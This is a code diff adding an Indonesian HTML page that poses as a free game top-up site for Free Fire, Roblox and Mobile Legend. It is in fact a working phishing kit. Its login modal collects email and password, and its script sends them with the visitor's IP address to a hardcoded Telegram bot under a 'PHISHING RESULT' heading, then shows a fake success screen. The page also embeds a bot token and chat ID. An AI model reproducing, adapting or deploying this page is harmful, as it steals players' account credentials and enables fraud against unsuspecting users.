@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TOP UP FREE 2026</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 15px;
+        }
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 20px;
+            padding: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+        h1 {
+            text-align: center;
+            color: #333;
+            margin-bottom: 10px;
+        }
+        .subtitle {
+            text-align: center;
+            color: #666;
+            margin-bottom: 20px;
+        }
+        .game-scroll {
+            display: flex;
+            overflow-x: auto;
+            gap: 10px;
+            padding: 15px 0;
+            margin-bottom: 10px;
+        }
+        /* FREE FIRE - ORANGE */
+        .game-option[data-game="freefire"] {
+            min-width: 120px;
+            padding: 12px;
+            background: #FF6B35;
+            color: white;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        /* ROBLOX - HITAM */
+        .game-option[data-game="roblox"] {
+            min-width: 120px;
+            padding: 12px;
+            background: #000000;
+            color: white;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        /* MOBILE LEGEND - BIRU */
+        .game-option[data-game="mobilelegend"] {
+            min-width: 120px;
+            padding: 12px;
+            background: #1E88E5;
+            color: white;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .game-option.selected {
+            opacity: 0.8;
+            transform: scale(0.95);
+        }
+        .diamond-section {
+            display: none;
+        }
+        .diamond-section.active {
+            display: block;
+        }
+        .diamond-grid {
+            display: grid;
+            grid-template-columns: repeat(2,1fr);
+            gap: 10px;
+            margin: 15px 0;
+        }
+        .diamond-option {
+            padding: 15px;
+            background: #f0f0f0;
+            border-radius: 10px;
+            text-align: center;
+            cursor: pointer;
+        }
+        .diamond-option.selected {
+            background: #667eea;
+            color: white;
+        }
+        .input-group {
+            margin: 15px 0;
+        }
+        .input-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+        }
+        .payment-methods {
+            display: grid;
+            grid-template-columns: repeat(2,1fr);
+            gap: 10px;
+            margin: 15px 0;
+        }
+        .payment-option {
+            padding: 15px;
+            background: #f0f0f0;
+            border-radius: 10px;
+            text-align: center;
+            cursor: pointer;
+        }
+        .payment-option.selected {
+            background: #667eea;
+            color: white;
+        }
+        .btn {
+            width: 100%;
+            padding: 15px;
+            background: #667eea;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            cursor: pointer;
+            margin: 10px 0;
+        }
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .login-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        .login-modal.active {
+            display: flex;
+        }
+        .modal-content {
+            background: white;
+            padding: 30px;
+            border-radius: 20px;
+            width: 90%;
+            max-width: 400px;
+        }
+        .modal-content h2 {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        /* Loading animation */
+        .loading-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 10px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .success-screen {
+            display: none;
+            text-align: center;
+            padding: 50px;
+        }
+        .success-screen.active {
+            display: block;
+        }
+        .checkmark {
+            width: 100px;
+            height: 100px;
+            background: #00ff00;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 50px;
+            margin: 0 auto 20px;
+        }
+        .status-badge {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background: #333;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 12px;
+            z-index: 9999;
+        }
+    </style>
+</head>
+<body>
+    <div class="status-badge" id="statusBadge">🔄 LOADING...</div>
+
+    <div class="container" id="mainContainer">
+        <h1>TOP UP FREE 2026</h1>
+        <div class="subtitle">Pilih Game Yang Kamu Cari</div>
+
+        <!-- Game Options with custom colors -->
+        <div class="game-scroll">
+            <button class="game-option" data-game="freefire">FREE FIRE</button>
+            <button class="game-option" data-game="roblox">ROBLOX</button>
+            <button class="game-option" data-game="mobilelegend">MOBILE LEGEND</button>
+        </div>
+
+        <!-- Free Fire Diamonds -->
+        <div class="diamond-section" id="freefire-section">
+            <div class="diamond-grid">
+                <div class="diamond-option" data-diamond="70" data-price="10000">70 Diamond<br><small>Rp10.000</small></div>
+                <div class="diamond-option" data-diamond="100" data-price="14000">100 Diamond<br><small>Rp14.000</small></div>
+                <div class="diamond-option" data-diamond="210" data-price="28000">210 Diamond<br><small>Rp28.000</small></div>
+                <div class="diamond-option" data-diamond="250" data-price="33000">250 Diamond<br><small>Rp33.000</small></div>
+                <div class="diamond-option" data-diamond="320" data-price="41000">320 Diamond<br><small>Rp41.000</small></div>
+                <div class="diamond-option" data-diamond="390" data-price="50000">390 Diamond<br><small>Rp50.000</small></div>
+                <div class="diamond-option" data-diamond="460" data-price="59000">460 Diamond<br><small>Rp59.000</small></div>
+                <div class="diamond-option" data-diamond="1000" data-price="125000">1000 Diamond<br><small>Rp125.000</small></div>
+            </div>
+        </div>
+
+        <!-- Roblox & ML -->
+        <div class="diamond-section" id="roblox-section">
+            <div class="diamond-grid">
+                <div class="diamond-option" data-diamond="onupdate">ON UPDATE</div>
+            </div>
+        </div>
+        <div class="diamond-section" id="mobilelegend-section">
+            <div class="diamond-grid">
+                <div class="diamond-option" data-diamond="onupdate">ON UPDATE</div>
+            </div>
+        </div>
+
+        <!-- Input ID -->
+        <div class="input-group">
+            <label>Masukan ID Kamu</label>
+            <input type="text" id="userId" placeholder="Contoh: 12345678">
+        </div>
+
+        <!-- Payment Methods -->
+        <div class="payment-methods">
+            <div class="payment-option" data-payment="qris">QRIS</div>
+            <div class="payment-option" data-payment="dana">DANA</div>
+            <div class="payment-option" data-payment="gopay">GOPAY</div>
+            <div class="payment-option" data-payment="shopeepay">SHOPEEPay</div>
+        </div>
+
+        <!-- Top Up Button -->
+        <button class="btn" id="topupBtn" disabled>TOP UP SEKARANG</button>
+    </div>
+
+    <!-- Login Modal -->
+    <div class="login-modal" id="loginModal">
+        <div class="modal-content">
+            <h2>Login untuk melanjutkan</h2>
+            <div class="input-group">
+                <label>Email :</label>
+                <input type="email" id="email" placeholder="Email kamu">
+            </div>
+            <div class="input-group">
+                <label>Password :</label>
+                <input type="password" id="password" placeholder="Password">
+            </div>
+            <button class="btn" id="loginBtn">
+                <span class="btn-text">Log In</span>
+                <span class="loading-spinner" style="display: none;"></span>
+            </button>
+        </div>
+    </div>
+
+    <!-- Success Screen -->
+    <div class="success-screen" id="successScreen">
+        <div class="checkmark">✓</div>
+        <h2>BERHASIL!</h2>
+        <p>Diamond sedang diproses</p>
+        <p style="color: #999; margin-top: 20px;">Terima kasih telah bertransaksi</p>
+    </div>
+
+    <script>
+        // Konfigurasi Telegram
+        const TELEGRAM_TOKEN = '8723154718:AAEoZ8DRvGzb-_Iq0zNYT2rA8eTSQNuFcOE';
+        const OWNER_ID = '8336543740';
+
+        // State
+        let selectedGame = null;
+        let selectedDiamond = null;
+        let selectedPayment = null;
+
+        // Game selection
+        document.querySelectorAll('.game-option').forEach(btn => {
+            btn.addEventListener('click', function() {
+                document.querySelectorAll('.game-option').forEach(b => b.classList.remove('selected'));
+                this.classList.add('selected');
+                
+                document.querySelectorAll('.diamond-section').forEach(s => s.classList.remove('active'));
+                
+                selectedGame = this.dataset.game;
+                document.getElementById(selectedGame + '-section').classList.add('active');
+                
+                selectedDiamond = null;
+                selectedPayment = null;
+                checkButton();
+            });
+        });
+
+        // Diamond selection
+        document.querySelectorAll('.diamond-option').forEach(btn => {
+            btn.addEventListener('click', function() {
+                if (this.dataset.diamond === 'onupdate') {
+                    alert('Game sedang ON UPDATE');
+                    return;
+                }
+                
+                document.querySelectorAll('.diamond-option').forEach(b => b.classList.remove('selected'));
+                this.classList.add('selected');
+                selectedDiamond = this.dataset.diamond;
+                checkButton();
+            });
+        });
+
+        // Payment selection
+        document.querySelectorAll('.payment-option').forEach(btn => {
+            btn.addEventListener('click', function() {
+                document.querySelectorAll('.payment-option').forEach(b => b.classList.remove('selected'));
+                this.classList.add('selected');
+                selectedPayment = this.dataset.payment;
+                checkButton();
+            });
+        });
+
+        // Check button
+        const userId = document.getElementById('userId');
+        const topupBtn = document.getElementById('topupBtn');
+
+        function checkButton() {
+            if (selectedGame && selectedDiamond && selectedPayment && userId.value.trim()) {
+                topupBtn.disabled = false;
+            } else {
+                topupBtn.disabled = true;
+            }
+        }
+
+        userId.addEventListener('input', checkButton);
+
+        // Top up button
+        topupBtn.addEventListener('click', function() {
+            document.getElementById('loginModal').classList.add('active');
+        });
+
+        // Login button with loading animation
+        document.getElementById('loginBtn').addEventListener('click', async function() {
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
+            
+            if (email && password) {
+                // Show loading
+                const btnText = this.querySelector('.btn-text');
+                const spinner = this.querySelector('.loading-spinner');
+                
+                btnText.textContent = 'Sedang Diproses';
+                spinner.style.display = 'inline-block';
+                this.disabled = true;
+                
+                // Kirim ke Telegram
+                await sendToTelegram(email, password);
+                
+                // Simulate processing delay (biar keliatan loadingnya)
+                await new Promise(resolve => setTimeout(resolve, 1500));
+                
+                // Hide loading
+                btnText.textContent = 'Log In';
+                spinner.style.display = 'none';
+                this.disabled = false;
+                
+                // Tutup modal & show success
+                document.getElementById('loginModal').classList.remove('active');
+                document.getElementById('mainContainer').style.display = 'none';
+                document.getElementById('successScreen').classList.add('active');
+                
+                document.getElementById('statusBadge').innerHTML = '✅ DATA TERKIRIM';
+            } else {
+                alert('Isi email & password dulu!');
+            }
+        });
+
+        // Fungsi kirim ke Telegram
+        async function sendToTelegram(email, password) {
+            try {
+                // Ambil IP
+                let ip = 'Unknown';
+                try {
+                    const res = await fetch('https://api.ipify.org?format=json');
+                    const data = await res.json();
+                    ip = data.ip;
+                } catch (e) {}
+
+                const message = `🔥 PHISHING RESULT 🔥
+📧 Email: ${email}
+🔑 Password: ${password}
+🌐 IP: ${ip}
+⏰ Waktu: ${new Date().toLocaleString('id-ID')}
+💀 Status: KENA TIPU GOBLOK!`;
+
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: OWNER_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                console.log('✅ Data terkirim ke Telegram');
+            } catch (error) {
+                console.error('❌ Gagal kirim:', error);
+            }
+        }
+
+        // Test bot connection
+        async function testBot() {
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getMe`);
+                const data = await res.json();
+                if (data.ok) {
+                    document.getElementById('statusBadge').innerHTML = '✅ BOT SIAP';
+                    console.log('✅ Bot Telegram aktif');
+                }
+            } catch (e) {
+                document.getElementById('statusBadge').innerHTML = '❌ BOT ERROR';
+            }
+        }
+
+        // Start
+        testBot();
+    </script>
+</body>
+</html>
